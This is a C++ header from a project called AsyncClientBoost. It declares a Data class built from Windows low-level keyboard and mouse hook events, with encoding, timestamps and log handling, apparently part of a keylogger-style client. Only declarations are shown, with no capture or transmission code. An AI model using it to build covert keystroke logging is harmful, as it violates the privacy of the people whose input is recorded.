//
//  Data.h
//  AsyncClientBoost
//
//  Created by Charles Fournier on 01/11/2014.
//  Copyright (c) 2014 Charles Fournier. All rights reserved.
//

#ifndef __AsyncClientBoost__Data__
#define __AsyncClientBoost__Data__

#include <stdio.h>
#include <string>
#include <chrono>
#include <Windows.h>
#include <iostream>
#include "ProtocoleSpider.h"


class Data {
private:
	t_header	_header;
	t_log		_log;
	bool		_haveLog;
	time_t		_timer;
	bool		_encoded;
	bool		_logEncoded;
        
public:
    Data(KBDLLHOOKSTRUCT hooked, WPARAM wParam);
	Data(MSLLHOOKSTRUCT hooked, WPARAM wParam);
	Data(const e_type type);
	Data(char *focus);
	Data(void *logPtr);
	Data();
    ~Data();

	t_size		getHeaderSize();
	t_size		getLogSize();
	int64_t		getTimestamp();
	bool		haveLog();
	bool		isEncoded();
	t_header	*getHeader();
	t_log		*getLog();

	time_t		getTimer();

	void		showData();
	void		encode();

	static void decode(t_magic_header *header);
	static void decode(t_header *header);

	static void display(t_magic_header *header);
	static void display(t_header *header);
};



#endif /* defined(__AsyncClientBoost__Data__) */
